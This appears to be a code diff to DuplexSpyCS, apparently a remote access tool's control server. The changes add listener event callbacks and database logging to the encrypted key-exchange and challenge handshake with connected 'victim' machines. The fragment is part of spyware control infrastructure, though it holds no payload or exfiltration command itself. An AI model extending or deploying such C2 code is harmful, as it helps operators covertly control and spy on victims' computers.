@@ -105,9 +105,12 @@ namespace DuplexSpyCS
                     m_listener = new TcpListener(IPAddress.Any, m_nPort);
                 m_cts = new CancellationTokenSource();
                 m_listener.Start();
+
                 _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
+
                 m_bIslistening = true;
 
+                fnOnListenerStarted(this);
             }
             catch (Exception ex)
             {
@@ -140,6 +143,8 @@ namespace DuplexSpyCS
                 m_cts.Cancel();
                 m_listener.Stop();
                 m_bIslistening = false;
+
+                fnOnListenerStopped(this);
             }
             catch (Exception ex)
             {
@@ -222,10 +227,14 @@ namespace DuplexSpyCS
                             if (nParam == 0)
                             {
                                 //Send RSA public key.
+                                clsStore.sql_conn.WriteKeyExchange(victim, "Sent RSA public key.");
+
                                 victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
                             }
                             else if (nParam == 1)
                             {
+                                clsStore.sql_conn.WriteKeyExchange(victim, "Received AES cipher.");
+
                                 byte[] abEncAesData = Convert.FromBase64String(Encoding.UTF8.GetString(abMsg));
                                 byte[] abPlainData = clsCrypto.RSADecrypt(abEncAesData, victim.key_pairs.private_key);
                                 string szPlainData = Encoding.UTF8.GetString(abPlainData);
@@ -242,6 +251,9 @@ namespace DuplexSpyCS
                                 victim.challenge_text = szChallenge;
 
                                 string szCipher = clsCrypto.AESEncrypt(szChallenge, abKey, abIV);
+
+                                clsStore.sql_conn.WriteKeyExchange(victim, "Sent challenge message.");
+
                                 victim.Send(new clsHttpResp(1, 2, szCipher).fnGetBytes());
                             }
                             else if (nParam == 3)
@@ -251,9 +263,9 @@ namespace DuplexSpyCS
 
                                 if (string.Equals(payload, victim.challenge_text))
                                 {
-                                    victim.Send(new clsHttpResp(1, 4, clsEZData.fnGenerateRandomStr()).fnGetBytes());
+                                    clsStore.sql_conn.WriteKeyExchange(victim, "Challenge text is correct. Sent initial command.");
 
-                                    //victim.fnSendCmdParam(2, 1);
+                                    victim.Send(new clsHttpResp(1, 4, clsEZData.fnGenerateRandomStr()).fnGetBytes());
                                 }
                             }
                         }
